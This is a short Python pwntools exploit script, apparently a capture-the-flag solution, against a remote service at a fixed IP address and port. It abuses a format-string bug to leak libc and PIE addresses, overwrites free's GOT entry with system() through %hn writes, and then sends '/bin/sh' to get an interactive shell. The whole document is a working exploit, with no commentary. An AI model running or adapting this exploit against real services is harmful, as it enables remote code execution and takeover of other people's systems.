from pwn import*
p = remote('111.198.29.45',46636)
libc= ELF('./libc-2.23.so',checksec=False)
context.log_level ='DEBUG'
p.sendlineafter('Input Your Code:\n','1')
payload = 'U'*0x3E8+ 'MM'+ '%397$p%396$p'
p.send(payload)
p.recvuntil('%397$p%396$p')
libc_start = int(p.recv(14),16) - 0xF0
pie = int(p.recv(14),16) -0xDA0
libc_base = libc_start - libc.sym['__libc_start_main']
free_got = pie+0x202018
system = libc.sym['system']+ libc_base
I	= (system & 0xFFFF) - 0x3E8 - 0x16
II	= ((system >> 16) & 0xFFFF) - 0x3E8 - 0x16
III	= ((system >> 32) & 0xFFFF) - 0x3E8 - 0x16
p.sendlineafter('Input Your Code:\n','1')
payload = 'U' * 0x3E8 + ('MM%' + str(I) + 'c%133$hn')	+ p64(free_got)
p.sendline(payload)
p.sendlineafter('Input Your Code:\n','1')
payload = 'U' * 0x3E8 + ('MM%' + str(II) + 'c%133$hn')	+ p64(free_got + 2)
p.sendline(payload)
p.sendlineafter('Input Your Code:\n','1')
payload = 'U' * 0x3E8 + ('MM%' + str(III) + 'c%133$hn') + p64(free_got + 4)
p.sendline(payload)
p.sendlineafter('Input Your Code:\n','2')
p.send('/bin/sh\x00')
p.interactive()
